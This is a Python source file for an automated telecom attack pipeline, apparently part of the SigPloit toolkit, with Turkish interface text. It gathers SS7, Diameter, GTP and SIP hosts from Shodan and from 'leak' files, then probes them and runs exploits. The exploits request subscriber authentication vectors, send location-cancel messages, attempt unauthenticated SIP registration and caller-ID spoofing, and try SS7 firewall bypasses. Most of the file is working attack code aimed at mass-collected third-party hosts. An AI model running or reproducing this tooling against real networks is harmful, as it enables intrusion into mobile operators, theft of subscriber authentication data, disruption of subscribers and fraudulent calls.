#!/usr/bin/env python
"""
SigPloit Auto Chain - Automated Attack Pipeline
Scan -> Verify -> Exploit -> Report in one command.

Supports attack profiles for customizable test sequences.
"""
import sys
import os
import json
import time
import socket
import struct
import random
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add parent dir to path
sys.path.insert(0, os.path.dirname(__file__))


def get_input(prompt, default=None):
    if default:
        data = input(f"{prompt} [{default}]: ").strip()
        return data if data else default
    return input(f"{prompt}: ").strip()


def _prompt_int(prompt, default, min_value=None, max_value=None):
    while True:
        raw_value = get_input(prompt, str(default))
        try:
            value = int(raw_value)
        except ValueError:
            print("[-] Lutfen sayisal bir deger girin.")
            continue
        if min_value is not None and value < min_value:
            print(f"[-] Deger en az {min_value} olmalidir.")
            continue
        if max_value is not None and value > max_value:
            print(f"[-] Deger en fazla {max_value} olmalidir.")
            continue
        return value


def _prompt_yes_no(prompt, default="e"):
    return get_input(prompt, default).lower() in ["e", "evet", "y", "yes"]


def _is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except OSError:
        return False


# ============================================
# PROFILE SYSTEM
# ============================================

DEFAULT_PROFILES = {
    'full_audit': {
        'name': 'Tam Denetim',
        'description': 'Tum protokoller ve saldiri turleri',
        'protocols': ['SS7', 'DIAMETER', 'GTP', 'SIP'],
        'verify': True,
        'exploit': True,
        'report': True,
        'max_targets': 50,
        'timeout': 5,
    },
    'quick_recon': {
        'name': 'Hizli Kesif',
        'description': 'Sadece port tarama ve dogrulama',
        'protocols': ['SS7', 'DIAMETER', 'GTP', 'SIP'],
        'verify': True,
        'exploit': False,
        'report': True,
        'max_targets': 100,
        'timeout': 3,
    },
    'diameter_only': {
        'name': 'Sadece Diameter',
        'description': 'Diameter (4G/LTE) odakli denetim',
        'protocols': ['DIAMETER'],
        'verify': True,
        'exploit': True,
        'report': True,
        'max_targets': 30,
        'timeout': 5,
    },
    'sip_only': {
        'name': 'Sadece SIP',
        'description': 'SIP/VoIP odakli denetim',
        'protocols': ['SIP'],
        'verify': True,
        'exploit': True,
        'report': True,
        'max_targets': 50,
        'timeout': 3,
    },
    'ss7_deep': {
        'name': 'SS7 Derin Analiz',
        'description': 'SS7/SIGTRAN detayli zafiyet testi',
        'protocols': ['SS7'],
        'verify': True,
        'exploit': True,
        'report': True,
        'max_targets': 50,
        'timeout': 6,
    },
}


def load_profile(name):
    """Load a profile by name."""
    # Check built-in profiles
    if name in DEFAULT_PROFILES:
        return DEFAULT_PROFILES[name]

    # Check profiles directory
    profiles_dir = os.path.join(os.path.dirname(__file__), 'profiles')
    profile_path = os.path.join(profiles_dir, f"{name}.json")

    if os.path.exists(profile_path):
        with open(profile_path, 'r') as f:
            return json.load(f)

    return None


def save_profile(name, profile):
    """Save a profile to disk."""
    profiles_dir = os.path.join(os.path.dirname(__file__), 'profiles')
    os.makedirs(profiles_dir, exist_ok=True)

    profile_path = os.path.join(profiles_dir, f"{name}.json")
    with open(profile_path, 'w') as f:
        json.dump(profile, f, indent=2, ensure_ascii=False)
    print(f"[+] Profil kaydedildi: {profile_path}")


# ============================================
# STEP 1: TARGET COLLECTION
# ============================================

def collect_targets(profile):
    """Collect targets from files or manual input."""
    targets = {proto: [] for proto in profile['protocols']}

    print("\n" + "=" * 50)
    print(" Adim 1: Hedef Toplama")
    print("=" * 50)

    print("\nHedef kaynagi secin:")
    print("  1) Mevcut dosyalardan oku")
    print("  2) Manuel IP girisi")
    print("  3) Shodan'dan cek (API gerekli)")

    source = get_input("Kaynak", "1").lower()

    if source == "1":
        targets = _load_targets_from_files(profile['protocols'])
    elif source == "2":
        targets = _manual_targets(profile['protocols'])
    elif source == "3":
        targets = _shodan_targets(profile['protocols'])

    total = sum(len(v) for v in targets.values())
    print(f"\n[+] Toplam hedef: {total}")

    # Limit
    max_t = profile.get('max_targets', 50)
    for proto in targets:
        if len(targets[proto]) > max_t:
            targets[proto] = targets[proto][:max_t]
            print(f"  [{proto}] {max_t} hedefe sinirlandirildi")

    return targets


def _load_targets_from_files(protocols):
    """Load targets from existing leak/result files."""
    targets = {proto: [] for proto in protocols}

    file_map = {
        'SS7': ['turkey_verified.txt', 'turkey_ss7_results.txt', 'leaks_ss7.txt', 'leaks.txt'],
        'DIAMETER': ['leaks_diameter_new.txt', 'leaks_diameter.txt', 'leaks_diameter_shodan.txt'],
        'GTP': ['leaks_gtp.txt', 'leaks_gtp_shodan.txt'],
        'SIP': ['leaks_sip.txt', 'leaks_sip_shodan.txt'],
    }

    default_ports = {
        'SS7': 2905,
        'DIAMETER': 3868,
        'GTP': 2123,
        'SIP': 5060,
    }

    import re
    ip_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

    for proto in protocols:
        if proto not in file_map:
            continue

        for fname in file_map[proto]:
            if not os.path.exists(fname):
                continue
            try:
                found_in_file = []
                with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#') or line.startswith('=') or line.startswith('-'):
                            continue

                        # Try IP:port format first
                        part = line.split('|')[0].strip().split()[0] if line.split('|')[0].strip() else ''
                        if ':' in part:
                            ip_port = part.split(':')
                            try:
                                ip = ip_port[0].strip()
                                port = int(ip_port[1].strip())
                                if ip_pattern.match(ip):
                                    found_in_file.append((ip, port))
                                    continue
                            except (ValueError, IndexError):
                                pass

                        # Try extracting IP with regex (for turkey results format)
                        m = ip_pattern.search(line)
                        if m:
                            ip = m.group(1)
                            # Try to find port in line
                            port_match = re.search(r':(\d{4,5})', line)
                            port = int(port_match.group(1)) if port_match else default_ports.get(proto, 0)
                            found_in_file.append((ip, port))

                if found_in_file:
                    # Deduplicate by IP
                    seen = set()
                    for ip, port in found_in_file:
                        if ip not in seen:
                            seen.add(ip)
                            targets[proto].append((ip, port))
                    print(f"  [{proto}] {fname}: {len(targets[proto])} hedef yuklendi")
                    break  # Use first file with actual results
                else:
                    print(f"  [{proto}] {fname}: bos, siradaki dosyaya geciliyor...")
            except Exception as e:
                print(f"  [-] {fname} okunamadi: {e}")

    return targets


def _manual_targets(protocols):
    """Get targets from manual input."""
    targets = {proto: [] for proto in protocols}

    print("\nIP adreslerini girin (bos satirda bitir):")
    print("Format: IP:PORT veya sadece IP (varsayilan port kullanilir)")

    default_ports = {'SS7': 2905, 'DIAMETER': 3868, 'GTP': 2123, 'SIP': 5060}

    for proto in protocols:
        print(f"\n[{proto}] hedefler (bos = gecir):")
        while True:
            line = input(f"  {proto}> ").strip()
            if not line:
                break
            if ':' in line:
                parts = line.split(':')
                try:
                    ip = parts[0].strip()
                    port = int(parts[1])
                    if not _is_valid_ip(ip):
                        print("  [-] Gecersiz IP adresi")
                        continue
                    if not (1 <= port <= 65535):
                        print("  [-] Gecersiz port araligi")
                        continue
                    targets[proto].append((ip, port))
                except ValueError:
                    print("  [-] Gecersiz format")
            else:
                if not _is_valid_ip(line):
                    print("  [-] Gecersiz IP adresi")
                    continue
                targets[proto].append((line, default_ports.get(proto, 0)))

    return targets


def _shodan_targets(protocols):
    """Get targets from Shodan."""
    targets = {proto: [] for proto in protocols}

    try:
        from ss7.shodan_search import load_config, search_shodan_all
        config = load_config()
        if not config.get('shodan_api_key'):
            print("[-] Shodan API anahtari config.ini'de bulunamadi.")
            return targets

        results = search_shodan_all(config['shodan_api_key'], protocols, max_per_query=50)
        for proto, hits in results.items():
            for h in hits:
                targets[proto].append((h['ip'], h['port']))
    except Exception as e:
        print(f"[-] Shodan hatasi: {e}")

    return targets


# ============================================
# STEP 2: VERIFICATION
# ============================================

def verify_targets(targets, profile):
    """Verify targets with protocol-level handshakes."""
    print("\n" + "=" * 50)
    print(" Adim 2: Protokol Dogrulama")
    print("=" * 50)

    verified = {proto: [] for proto in targets}
    timeout = profile.get('timeout', 5)

    for proto, target_list in targets.items():
        if not target_list:
            continue

        print(f"\n[{proto}] {len(target_list)} hedef dogrulaniyor...")

        verify_func = {
            'SS7': _verify_ss7,
            'DIAMETER': _verify_diameter,
            'GTP': _verify_gtp,
            'SIP': _verify_sip,
        }.get(proto)

        if not verify_func:
            continue

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for ip, port in target_list:
                futures[executor.submit(verify_func, ip, port, timeout)] = (ip, port)

            for future in as_completed(futures):
                ip, port = futures[future]
                try:
                    success, info = future.result()
                    if success:
                        verified[proto].append((ip, port, info))
                        print(f"  \033[32m[+] {ip}:{port} - DOGRULANDI: {info}\033[0m")
                    else:
                        print(f"  [-] {ip}:{port} - {info}")
                except Exception as e:
                    print(f"  [-] {ip}:{port} - Hata: {e}")

        print(f"  [{proto}] Dogrulanan: {len(verified[proto])}/{len(target_list)}")

    return verified


def _verify_ss7(ip, port, timeout):
    """Verify SS7/M3UA - TCP connection is enough (firewall may block M3UA)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # TCP connected = port is open and something is listening
        # Try M3UA ASP Up but don't require response
        try:
            asp_up = (b'\x01\x00\x03\x01'  # Version, Reserved, Class, Type
                       b'\x00\x00\x00\x08')  # Length
            sock.send(asp_up)

            resp = sock.recv(1024)
            sock.close()

            if resp and len(resp) >= 8:
                msg_class = resp[2] if len(resp) > 2 else 0
                msg_type = resp[3] if len(resp) > 3 else 0
                if msg_class == 3 and msg_type == 4:
                    return True, "M3UA ASP Up Ack - TAM ACIK"
                elif msg_class == 0:
                    return True, "M3UA Management yanit"
                return True, f"M3UA yanit ({len(resp)} byte)"
        except socket.timeout:
            try:
                sock.close()
            except Exception:
                pass
            return True, "TCP acik (M3UA timeout - firewall)"
        except ConnectionResetError:
            return True, "TCP acik (M3UA reset - firewall aktif)"
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            return True, "TCP acik"

        return True, "TCP acik"
    except socket.timeout:
        return False, "Zaman asimi"
    except ConnectionRefusedError:
        return False, "Baglanti reddedildi"
    except ConnectionResetError:
        # Connection reset during TCP connect = something is there but blocking
        return True, "TCP reset (firewall aktif, port acik)"
    except Exception as e:
        return False, str(e)


def _verify_diameter(ip, port, timeout):
    """Verify Diameter with CER/CEA handshake."""
    try:
        from ss7.attacks.diameter_module import build_cer, parse_diameter_response

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        cer = build_cer("probe.sigploit.local", "sigploit.local")
        sock.send(cer)

        resp = sock.recv(4096)
        sock.close()

        if resp and len(resp) >= 20:
            parsed = parse_diameter_response(resp)
            if parsed['result_code'] == 2001:
                origin = parsed.get('origin_host', 'N/A')
                return True, f"CEA Success - {origin}"
            elif parsed['result_code'] > 0:
                return True, f"CEA RC={parsed['result_code']}"
            return True, f"Diameter yanit ({len(resp)} byte)"
        return False, "Yanit yok"
    except socket.timeout:
        return False, "Zaman asimi"
    except ConnectionRefusedError:
        return False, "Baglanti reddedildi"
    except Exception as e:
        return False, str(e)


def _verify_gtp(ip, port, timeout):
    """Verify GTP with Echo Request."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)

        # GTPv2 Echo Request
        seq = random.randint(1, 0xFFFFFF)
        echo = struct.pack("!BBHI",
                           0x40,  # Version=2, T=0
                           1,     # Echo Request
                           0,     # Length
                           0)     # TEID
        echo += struct.pack("!I", (seq << 8))[:3] + b'\x00'  # Sequence + spare

        sock.sendto(echo, (ip, port))
        data, addr = sock.recvfrom(1024)
        sock.close()

        if data and len(data) >= 4:
            msg_type = data[1] if len(data) > 1 else 0
            if msg_type == 2:
                return True, "GTP Echo Response"
            return True, f"GTP yanit (type={msg_type})"
        return False, "Yanit yok"
    except socket.timeout:
        return False, "Zaman asimi"
    except Exception as e:
        return False, str(e)


def _verify_sip(ip, port, timeout):
    """Verify SIP with OPTIONS."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)

        branch = f"z9hG4bK{random.randint(100000, 999999)}"
        call_id = f"{random.randint(100000000, 999999999)}@sigploit"

        options = (
            f"OPTIONS sip:{ip}:{port} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP 1.2.3.4:5060;branch={branch}\r\n"
            f"From: <sip:probe@sigploit.local>;tag={random.randint(10000,99999)}\r\n"
            f"To: <sip:{ip}:{port}>\r\n"
            f"Call-ID: {call_id}\r\n"
            f"CSeq: 1 OPTIONS\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        sock.sendto(options.encode(), (ip, port))
        data, addr = sock.recvfrom(4096)
        sock.close()

        resp = data.decode('utf-8', errors='ignore')
        if 'SIP/2.0' in resp:
            status = resp.split('\r\n')[0].split(' ', 2)
            code = int(status[1]) if len(status) >= 2 else 0
            server = ''
            for line in resp.split('\r\n'):
                if line.lower().startswith('server:'):
                    server = line.split(':', 1)[1].strip()
                    break
            return True, f"SIP {code} - {server}" if server else f"SIP {code}"
        return False, "Gecersiz yanit"
    except socket.timeout:
        return False, "Zaman asimi"
    except Exception as e:
        return False, str(e)


# ============================================
# STEP 3: EXPLOITATION
# ============================================

def exploit_targets(verified, profile):
    """Run exploit tests on verified targets."""
    print("\n" + "=" * 50)
    print(" Adim 3: Zafiyet Testi")
    print("=" * 50)

    results = []

    for proto, target_list in verified.items():
        if not target_list:
            continue

        print(f"\n[{proto}] {len(target_list)} dogrulanmis hedef test edilecek...")

        for ip, port, verify_info in target_list:
            print(f"\n  [>] {ip}:{port} ({verify_info})")

            if proto == 'DIAMETER':
                result = _exploit_diameter(ip, port)
            elif proto == 'SIP':
                result = _exploit_sip(ip, port)
            elif proto == 'SS7':
                result = _exploit_ss7(ip, port)
            elif proto == 'GTP':
                result = _exploit_gtp(ip, port)
            else:
                result = {'status': 'SKIPPED', 'details': 'Exploit yok'}

            result['ip'] = ip
            result['port'] = port
            result['protocol'] = proto
            result['verify_info'] = verify_info
            results.append(result)

    return results


def _exploit_diameter(ip, port):
    """Test Diameter vulnerabilities."""
    result = {'status': 'TESTED', 'details': '', 'vulns': []}

    try:
        from ss7.attacks.diameter_module import (
            build_cer, build_air, build_ulr, build_clr,
            parse_diameter_response
        )

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        sock.connect((ip, port))

        # CER handshake
        cer = build_cer("mme.audit.sigploit", "audit.sigploit")
        sock.send(cer)
        cea = sock.recv(4096)

        if not cea:
            sock.close()
            return {'status': 'FAILED', 'details': 'CEA yok', 'vulns': []}

        cea_parsed = parse_diameter_response(cea)
        origin = cea_parsed.get('origin_host', 'N/A')
        result['details'] = f"Origin: {origin}"

        # Test AIR (auth vector)
        test_imsi = "999991234567890"
        plmn = bytes.fromhex("99999f")
        air = build_air(test_imsi, "mme.audit.sigploit", "audit.sigploit",
                         origin, cea_parsed.get('origin_realm', ''), plmn)
        sock.send(air)
        air_resp = sock.recv(4096)

        if air_resp:
            air_parsed = parse_diameter_response(air_resp)
            rc = air_parsed.get('result_code', 0)
            if rc == 2001:
                result['vulns'].append("AIR: Auth vektorleri alinabilir!")
                print(f"    \033[31m[!!!] AIR ZAFIYET: RC=2001\033[0m")
            elif rc == 5420:
                print(f"    [*] AIR: Kullanici bulunamadi (beklenen)")
            else:
                print(f"    [*] AIR: RC={rc}")

        time.sleep(0.3)

        # Test CLR
        clr_avps = b''
        from ss7.attacks.diameter_module import build_avp, build_diameter_header, DIAMETER_CLR, finalize_message
        from ss7.attacks.diameter_module import AVP_SESSION_ID, AVP_ORIGIN_HOST, AVP_ORIGIN_REALM, AVP_USER_NAME, AVP_AUTH_SESSION_STATE, VENDOR_3GPP

        clr_avps += build_avp(AVP_SESSION_ID, "mme.audit.sigploit;clr;test")
        clr_avps += build_avp(AVP_ORIGIN_HOST, "mme.audit.sigploit")
        clr_avps += build_avp(AVP_ORIGIN_REALM, "audit.sigploit")
        clr_avps += build_avp(AVP_USER_NAME, test_imsi)
        clr_avps += build_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))
        clr_avps += build_avp(1420, struct.pack("!I", 0), vendor_id=VENDOR_3GPP)
        clr_header = build_diameter_header(DIAMETER_CLR, app_id=16777251)
        clr = finalize_message(clr_header, clr_avps)

        sock.send(clr)
        clr_resp = sock.recv(4096)

        if clr_resp:
            clr_parsed = parse_diameter_response(clr_resp)
            rc = clr_parsed.get('result_code', 0)
            if rc == 2001:
                result['vulns'].append("CLR: Abone lokasyonu iptal edilebilir!")
                print(f"    \033[31m[!!!] CLR ZAFIYET: RC=2001\033[0m")
            else:
                print(f"    [*] CLR: RC={rc}")

        sock.close()

        if result['vulns']:
            result['status'] = 'VULNERABLE'
        else:
            result['status'] = 'SECURE'

    except Exception as e:
        result['status'] = 'ERROR'
        result['details'] = str(e)

    return result


def _exploit_sip(ip, port):
    """Test SIP vulnerabilities."""
    result = {'status': 'TESTED', 'details': '', 'vulns': []}

    try:
        from ss7.attacks.sip_module import (
            build_sip_options, build_sip_register, build_sip_invite,
            send_sip_message_net, parse_sip_response
        )

        # Test 1: OPTIONS
        msg = build_sip_options(ip, port)
        resp, _ = send_sip_message_net(ip, port, msg, timeout=3)
        if resp:
            parsed = parse_sip_response(resp)
            result['details'] = f"Server: {parsed.get('server', 'N/A')}"
            print(f"    [*] OPTIONS: {parsed['status_code']}")

        # Test 2: REGISTER without auth
        msg = build_sip_register(ip, port, "test@sigploit", "test@sigploit", "test@1.2.3.4")
        resp, _ = send_sip_message_net(ip, port, msg, timeout=3)
        if resp:
            parsed = parse_sip_response(resp)
            if parsed['status_code'] == 200:
                result['vulns'].append("REGISTER: Auth olmadan kayit kabul ediliyor!")
                print(f"    \033[31m[!!!] REGISTER ZAFIYET: 200 OK\033[0m")
            else:
                print(f"    [*] REGISTER: {parsed['status_code']}")

        # Test 3: INVITE with spoofed caller
        msg, _, _ = build_sip_invite(ip, port, "spoofed@evil.com", "100",
                                      display_name="Fake Name")
        resp, _ = send_sip_message_net(ip, port, msg, timeout=3)
        if resp:
            parsed = parse_sip_response(resp)
            if parsed['status_code'] in [100, 180, 183, 200]:
                result['vulns'].append("INVITE: Caller-ID spoofing mumkun!")
                print(f"    \033[31m[!!!] CALLERID ZAFIYET: {parsed['status_code']}\033[0m")
            else:
                print(f"    [*] INVITE: {parsed['status_code']}")

        if result['vulns']:
            result['status'] = 'VULNERABLE'
        else:
            result['status'] = 'SECURE'

    except Exception as e:
        result['status'] = 'ERROR'
        result['details'] = str(e)

    return result


def _exploit_ss7(ip, port):
    """Test SS7 vulnerabilities with firewall bypass techniques."""
    result = {'status': 'TESTED', 'details': '', 'vulns': []}

    # Phase 1: Quick standard M3UA test
    quick_vuln = False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))

        asp_up = b'\x01\x00\x03\x01\x00\x00\x00\x08'
        sock.send(asp_up)

        try:
            resp = sock.recv(1024)
            if resp and len(resp) >= 8:
                msg_class = resp[2]
                msg_type = resp[3]
                if msg_class == 3 and msg_type == 4:
                    result['vulns'].append(f"M3UA ASP Up kimlik dogrulamasi YOK (port {port})!")
                    print(f"    \033[31m[!!!] M3UA ZAFIYET: ASP Up Ack (:{port})\033[0m")
                    quick_vuln = True

                    # Try ASP Active
                    asp_active = b'\x01\x00\x03\x03\x00\x00\x00\x08'
                    sock.send(asp_active)
                    try:
                        resp2 = sock.recv(1024)
                        if resp2 and len(resp2) >= 8 and resp2[2] == 3 and resp2[3] == 8:
                            result['vulns'].append(f"M3UA ASP Active kabul edildi (port {port}) - TAM ERISIM!")
                            print(f"    \033[31m[!!!] M3UA ZAFIYET: ASP Active Ack (:{port})\033[0m")
                    except Exception:
                        pass
        except (socket.timeout, ConnectionResetError):
            pass
        sock.close()
    except Exception:
        pass

    if quick_vuln:
        result['status'] = 'VULNERABLE'
        return result

    # Phase 2: Full firewall bypass techniques
    print(f"    \033[36m[~] Firewall bypass teknikleri deneniyor...\033[0m")
    try:
        from ss7.firewall_bypass import run_all_bypasses
        bypass_results = run_all_bypasses(ip, port, timeout=5, verbose=True)

        for br in bypass_results:
            if br.get('success'):
                level = br.get('level', 'INFO')
                technique = br.get('technique', '')
                response = br.get('response', '')

                if level == 'CRITICAL':
                    result['vulns'].append(f"Firewall Bypass [{technique}]: {response}")
                elif level in ('HIGH', 'MEDIUM'):
                    result['vulns'].append(f"Potansiyel Bypass [{technique}]: {response}")

        if result['vulns']:
            result['status'] = 'VULNERABLE'
            result['details'] = f"{len(result['vulns'])} bypass basarili"
        else:
            # Check if TCP was at least open
            tcp_open = any(
                'TCP acik' in r.get('response', '') 
                for r in bypass_results
            )
            if tcp_open:
                result['status'] = 'FIREWALL_ACTIVE'
                result['details'] = "TCP acik, tum bypass teknikleri engellendi"
                print(f"    \033[33m[*] Firewall aktif - tum teknikler engellendi\033[0m")
            else:
                result['status'] = 'UNREACHABLE'
                result['details'] = "Hedefe erisilemiyor"

    except ImportError:
        print(f"    \033[33m[!] firewall_bypass modulu bulunamadi, basit test yapiliyor\033[0m")
        result['status'] = 'FIREWALL_ACTIVE'
        result['details'] = "Basit test: TCP acik, M3UA engellendi"
    except Exception as e:
        result['status'] = 'ERROR'
        result['details'] = f"Bypass hatasi: {str(e)}"

    return result


def _exploit_gtp(ip, port):
    """Test GTP vulnerabilities."""
    result = {'status': 'TESTED', 'details': '', 'vulns': []}

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)

        # Echo Request
        seq = random.randint(1, 0xFFFFFF)
        echo = struct.pack("!BBHI", 0x40, 1, 0, 0)
        echo += struct.pack("!I", (seq << 8))[:3] + b'\x00'

        sock.sendto(echo, (ip, port))
        data, addr = sock.recvfrom(1024)

        if data and len(data) >= 4:
            msg_type = data[1]
            if msg_type == 2:
                result['details'] = "GTP Echo Response alindi"
                result['vulns'].append("GTP: Echo Response - nod aktif ve filtrelenmemis!")
                print(f"    \033[33m[!] GTP: Echo yanit alindi\033[0m")

        sock.close()

        if result['vulns']:
            result['status'] = 'VULNERABLE'
        else:
            result['status'] = 'SECURE'

    except socket.timeout:
        result['status'] = 'TIMEOUT'
        result['details'] = 'Zaman asimi'
    except Exception as e:
        result['status'] = 'ERROR'
        result['details'] = str(e)

    return result


# ============================================
# STEP 4: REPORTING
# ============================================

def generate_report(targets, verified, exploit_results, profile):
    """Generate comprehensive report."""
    print("\n" + "=" * 50)
    print(" Adim 4: Rapor Olusturma")
    print("=" * 50)

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    # Try using report generator
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'reporting'))
        from report_generator import ReportGenerator

        report = ReportGenerator(f"chain_report_{ts}.html")
        report.title = f"SigPloit Otomatik Denetim Raporu - {profile.get('name', 'Ozel')}"

        for r in exploit_results:
            status = r.get('status', 'UNKNOWN')
            if r.get('vulns'):
                status = "VULNERABLE"
            details = '; '.join(r.get('vulns', [])) or r.get('details', '')
            report.add_result(
                r.get('protocol', 'N/A'),
                f"{r['ip']}:{r['port']}",
                status,
                details
            )

        report.generate()
        report.export_json()
        report.export_csv()
    except Exception as e:
        print(f"[-] HTML rapor olusturulamadi: {e}")

    # Always generate text summary
    summary_file = f"chain_summary_{ts}.txt"
    with open(summary_file, "w", encoding="utf-8") as f:
        f.write("=" * 60 + "\n")
        f.write(" SigPloit Otomatik Denetim Ozeti\n")
        f.write(f" Tarih: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f" Profil: {profile.get('name', 'Ozel')}\n")
        f.write("=" * 60 + "\n\n")

        # Target summary
        f.write("HEDEF OZETI:\n")
        for proto in profile['protocols']:
            total = len(targets.get(proto, []))
            verif = len(verified.get(proto, []))
            f.write(f"  {proto}: {total} hedef -> {verif} dogrulandi\n")

        # Vulnerability summary
        vulns = [r for r in exploit_results if r.get('vulns')]
        f.write(f"\nZAFIYET OZETI: {len(vulns)} zafiyet bulundu\n\n")

        for r in exploit_results:
            f.write(f"  {r['protocol']:10s} {r['ip']:>15s}:{r['port']:<5d} ")
            f.write(f"| {r['status']:12s} | {r.get('details', '')}\n")
            for v in r.get('vulns', []):
                f.write(f"    -> {v}\n")

    print(f"\n[+] Ozet rapor: {summary_file}")

    # Print summary to console
    print("\n" + "=" * 60)
    print(" DENETIM SONUCLARI")
    print("=" * 60)

    total_targets = sum(len(v) for v in targets.values())
    total_verified = sum(len(v) for v in verified.values())
    total_vulns = len([r for r in exploit_results if r.get('vulns')])
    total_tested = len(exploit_results)

    total_firewall = len([r for r in exploit_results if r.get('status') == 'FIREWALL_ACTIVE'])
    total_unreachable = len([r for r in exploit_results if r.get('status') in ('UNREACHABLE', 'ERROR')])

    print(f"  Toplam Hedef:      {total_targets}")
    print(f"  Dogrulanan:        {total_verified}")
    print(f"  Test Edilen:       {total_tested}")
    print(f"  Zafiyet Bulunan:   \033[31m{total_vulns}\033[0m")
    print(f"  Firewall Aktif:    \033[33m{total_firewall}\033[0m")
    print(f"  Erisilemeyen:      {total_unreachable}")

    print()
    for r in exploit_results:
        if r.get('vulns'):
            print(f"  \033[31m[ZAFIYET]\033[0m {r['protocol']} {r['ip']}:{r['port']}")
            for v in r['vulns']:
                print(f"           -> {v}")
        elif r.get('status') == 'FIREWALL_ACTIVE':
            print(f"  \033[33m[FIREWALL]\033[0m {r['protocol']} {r['ip']}:{r['port']} - {r.get('details', '')[:60]}")

    print("=" * 60)

    return summary_file


# ============================================
# MAIN PIPELINE
# ============================================

def run_chain(profile_name=None):
    """Run the full automated chain."""
    os.system('cls' if os.name == 'nt' else 'clear')

    print("=" * 60)
    print(" SigPloit Otomatik Saldiri Zinciri")
    print(" Scan -> Verify -> Exploit -> Report")
    print("=" * 60)

    # Select profile
    if not profile_name:
        print("\nProfil Secin:")
        for i, (key, prof) in enumerate(DEFAULT_PROFILES.items()):
            print(f"  {i}) {prof['name']:20s} - {prof['description']}")
        print(f"  {len(DEFAULT_PROFILES)}) Ozel profil olustur")

        idx = _prompt_int("Profil", 0, min_value=0, max_value=len(DEFAULT_PROFILES))
        if idx >= len(DEFAULT_PROFILES):
            profile = _create_custom_profile()
        else:
            profile_name = list(DEFAULT_PROFILES.keys())[idx]
            profile = DEFAULT_PROFILES[profile_name]
    else:
        profile = load_profile(profile_name)
        if not profile:
            print(f"[-] Profil bulunamadi: {profile_name}")
            return

    print(f"\n[+] Profil: {profile['name']}")
    print(f"[+] Protokoller: {', '.join(profile['protocols'])}")
    print(f"[+] Dogrulama: {'Evet' if profile.get('verify') else 'Hayir'}")
    print(f"[+] Exploit: {'Evet' if profile.get('exploit') else 'Hayir'}")
    print(f"[+] Rapor: {'Evet' if profile.get('report') else 'Hayir'}")

    if not _prompt_yes_no("\nBaslatilsin mi? (e/h)", "e"):
        print("[-] Iptal edildi.")
        return

    start_time = time.time()

    # Step 1: Collect
    targets = collect_targets(profile)

    total_targets = sum(len(v) for v in targets.values())
    if total_targets == 0:
        print("\n[-] Hedef bulunamadi. Iptal ediliyor.")
        input("\nDevam etmek icin Enter'a basin...")
        return

    # Step 2: Verify
    verified = targets  # Default: skip verification
    if profile.get('verify', True):
        verified = verify_targets(targets, profile)

    total_verified = sum(len(v) for v in verified.values())
    if total_verified == 0 and profile.get('exploit'):
        # TCP acik olan hedefler varsa yine de exploit dene
        tcp_open = []
        for proto, tlist in targets.items():
            for t in tlist:
                tcp_open.append(t)
        if tcp_open:
            print(f"\n[!] Protokol dogrulama basarisiz ama {len(tcp_open)} hedef TCP acik. Exploit deneniyor...")
            for proto in targets:
                verified[proto] = targets[proto]  # TCP open = worth trying
        else:
            print("\n[-] Dogrulanmis hedef yok. Exploit atlaniyor.")
            profile['exploit'] = False

    # Step 3: Exploit
    exploit_results = []
    if profile.get('exploit', True):
        # Convert verified format for exploit step
        exploit_targets_list = {}
        for proto, items in verified.items():
            if isinstance(items, list) and items:
                if isinstance(items[0], tuple) and len(items[0]) >= 3:
                    exploit_targets_list[proto] = items
                else:
                    # Simple (ip, port) tuples - add empty info
                    exploit_targets_list[proto] = [(ip, port, '') for ip, port in items]
        exploit_results = exploit_targets(exploit_targets_list, profile)

    # Step 4: Report
    if profile.get('report', True):
        generate_report(targets, verified, exploit_results, profile)

    elapsed = time.time() - start_time
    print(f"\n[+] Toplam sure: {elapsed:.1f} saniye")
    input("\nDevam etmek icin Enter'a basin...")


def _create_custom_profile():
    """Create a custom profile interactively."""
    print("\n[+] Ozel Profil Olusturma")

    name = get_input("Profil adi", "ozel_profil")

    print("\nProtokol secin (virgul ile ayirin):")
    print("  SS7, DIAMETER, GTP, SIP")
    protos = get_input("Protokoller", "SS7,DIAMETER,GTP,SIP")
    protocols = [p.strip().upper() for p in protos.split(',')]

    verify = _prompt_yes_no("Dogrulama yapilsin mi? (e/h)", "e")
    exploit = _prompt_yes_no("Exploit testi yapilsin mi? (e/h)", "e")
    report = _prompt_yes_no("Rapor olusturulsun mu? (e/h)", "e")
    max_targets = _prompt_int("Maks hedef", 50, min_value=1, max_value=1000)
    timeout = _prompt_int("Zaman asimi (sn)", 5, min_value=1, max_value=60)

    profile = {
        'name': name,
        'description': 'Ozel profil',
        'protocols': protocols,
        'verify': verify,
        'exploit': exploit,
        'report': report,
        'max_targets': max_targets,
        'timeout': timeout,
    }

    if _prompt_yes_no("Profil kaydedilsin mi? (e/h)", "e"):
        save_profile(name, profile)

    return profile


# ============================================
# MENU
# ============================================

def chain_menu():
    """Auto chain menu."""
    os.system('cls' if os.name == 'nt' else 'clear')

    print("=" * 60)
    print(" Otomatik Saldiri Zinciri")
    print("=" * 60)
    print()
    print("  0) Tam Zincir Calistir (Profil Secimli)")
